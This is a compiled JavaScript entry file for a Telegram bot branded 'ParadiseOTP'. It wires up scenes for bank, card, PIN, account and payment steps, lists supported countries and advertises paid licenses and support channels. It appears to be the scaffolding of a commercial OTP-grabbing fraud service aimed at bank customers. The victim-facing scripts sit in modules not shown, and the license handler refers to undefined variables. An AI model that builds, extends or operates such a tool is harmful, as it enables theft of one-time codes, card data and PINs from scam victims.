"use strict";
var __awaiter = (this && this.__awaiter) || function(thisArg, _arguments, P, generator) {
  function adopt(value) { return value instanceof P ? value : new P(function(resolve) { resolve(value); }); }
  return new (P || (P = Promise))(function(resolve, reject) {
    function fulfilled(value) { try { step(generator.next(value)); } catch (e) { reject(e); } }
    function rejected(value) { try { step(generator["throw"](value)); } catch (e) { reject(e); } }
    function step(result) { result.done ? resolve(result.value) : adopt(result.value).then(fulfilled, rejected); }
    step((generator = generator.apply(thisArg, _arguments || [])).next());
  });
};
var __importDefault = (this && this.__importDefault) || function(mod) {
  return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", { value: true });
exports.bot = void 0;
require('dotenv').config();
const telegraf_1 = require("telegraf");
const getUser_1 = require("./utils/getUser");
const AccountStep_1 = require("./scenes/AccountStep");
const BankStep_1 = require("./scenes/BankStep");
const Buy_1 = require("./scenes/Buy");
const CardStep_1 = require("./scenes/CardStep");
const PayStep_1 = require("./scenes/PayStep");
const Start_1 = require("./scenes/Start");
const SuperWizardScene_1 = require("./scenes/SuperWizardScene");
const telegraf_session_local_1 = __importDefault(require("telegraf-session-local"));
const PGPStep_1 = require("./scenes/PGPStep");
const PinStep_1 = require("./scenes/PinStep");
const CustomStep_1 = require("./scenes/CustomStep");
require("./server");
const token = process.env.BOT_TOKEN;
if (token === undefined) {
  throw new Error('BOT_TOKEN must be provided!');
}
exports.bot = new telegraf_1.Telegraf(token);
const stage = new telegraf_1.Scenes.Stage([
  SuperWizardScene_1.superWizard,
  Buy_1.buyScene,
  Start_1.startScene,
  BankStep_1.bankStepScene,
  PayStep_1.payStepScene,
  AccountStep_1.accountStepScene,
  CardStep_1.cardStepScene,
  PinStep_1.pinStepScene,
  PGPStep_1.pgpStepScene,
  CustomStep_1.customStepScene,
], {
  default: 'super-wizard',
});

stage.start((ctx) => __awaiter(void 0, void 0, void 0, function*() {
  ctx.scene.enter('super-wizard');
  return ctx.scene.enter('START_ID');
}));
stage.command(`support`, (ctx) => __awaiter(void 0, void 0, void 0, function*() {
  return ctx.replyWithHTML(`
  We currently support the following countries:

    🇺🇸 United State 
    🇦🇺 Australia 
    🇬🇧 Great Britain 
    🇳🇿 New Zealand 
    🇿🇦 South Africa 
    🇪🇸 Spain 
    🇵🇹 Portugal 
    🇧🇷 Brazil 
    🇮🇹 Italia 
    🇫🇷 France 
    🇩🇪 Germany 
    🇳🇴 Norway 
    🇵🇱 Poland 
    🇸🇪 Sweden 
    🇹🇷 Turkey 
    🇳🇱 Netherland 
    🇩🇰 Denmark
  
  Contact us at <b><a href="https://t.me/ParadiseOTP">ParadiseSupport</a></b> to learn more.
  `, telegraf_1.Markup.inlineKeyboard([telegraf_1.Markup.button.callback('🤯 Start', 'cancel')]));
}));
stage.command(`help`, (ctx) => __awaiter(void 0, void 0, void 0, function*() {
  return ctx.replyWithHTML(` ✘ <b>Purchase a license:</b> https://paradisevip.cc\n ✘ <b>Telegram: </b>https://t.me/ParadiseOTP\n ✘ <b>Discord:</b> https://discord.gg/paradisevip\n\n ☁ <b>Support:</b> @SMSParadiseSupport\n ☁<b>Owners:</b> @truedex & @twixgod`, telegraf_1.Markup.inlineKeyboard([telegraf_1.Markup.button.callback('🤯 Start', 'cancel')]));
}));
stage.command(`license`, (ctx) => __awaiter(void 0, void 0, void 0, function*() {
  return ctx.replyWithHTML(`You currently have an active license, you are on the <b> ${user.fields.membershipType['en-US']}</b> plan and your license expires in <b>${(0, moment_1.default)(user.fields.membershipExpiry['en-US']).toNow(true)}.`, telegraf_1.Markup.inlineKeyboard([telegraf_1.Markup.button.callback(':exploding_head: Start', 'cancel')]));
  ctx.wizard.state.chatId = Number(user.fields.id['en-US']);
}));
stage.action('call', (ctx) => __awaiter(void 0, void 0, void 0, function*() {
  return ctx.scene.enter('START_ID');
}));
stage.action('cancel', (ctx) => __awaiter(void 0, void 0, void 0, function*() {
  yield ctx.reply('Operation cancelled successfully ✅');
  return ctx.scene.enter('super-wizard');
}));
stage.action('valid', () => {
  exports.bot.context.valid = true;
});
stage.action('invalid', () => {
  exports.bot.context.valid = false;
});
stage.command('cancel', (ctx) => __awaiter(void 0, void 0, void 0, function*() {
  yield ctx.reply('Operation cancelled successfully ✅');
  return ctx.scene.enter('super-wizard');
}));
exports.bot.use(new telegraf_session_local_1.default().middleware());
exports.bot.use(stage.middleware());
exports.bot.catch((err) => {
  console.log(err);
});
exports.bot.launch();
process.once('SIGINT', () => exports.bot.stop('SIGINT'));
process.once('SIGTERM', () => exports.bot.stop('SIGTERM'));
